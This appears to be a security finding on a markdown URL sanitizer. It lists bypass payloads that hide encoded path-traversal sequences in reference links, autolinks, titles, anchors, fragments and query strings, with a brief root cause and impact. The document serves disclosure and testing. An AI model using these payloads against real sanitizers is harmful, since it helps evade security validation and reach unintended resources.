# 🚨 CRITICAL: Parser Differential Bypasses - WORKING ATTACKS

## Root Cause: Incomplete URL Validation
The sanitizer only validates primary URLs but not reference definitions, fragments, query parameters, or title attributes.

## Working Bypasses:

### Reference-Style Links
[link][ref]

[ref]: https://example.com/safe/..%2fattack

### Autolinks  
<https://example.com/safe/..%2fattack>

### Title Attributes
[link](https://example.com/safe/..%2fattack "title")
[link](https://example.com/safe "..%2fattack")

### Nested Image/Link Combinations
[![alt](https://example.com/safe/..%2fattack.png)](https://example.com/safe/..%2fattack)

### HTML-to-Markdown Conversion
<a href="https://example.com/safe/..%2fattack">[link]</a>

### Fragment Identifiers
[link](https://example.com/safe#..%2fattack)

### Query Parameters  
[link](https://example.com/safe?path=..%2fattack)

## Impact: Multiple Attack Vectors
Each of these provides a different way to bypass URL validation, making comprehensive defense extremely difficult.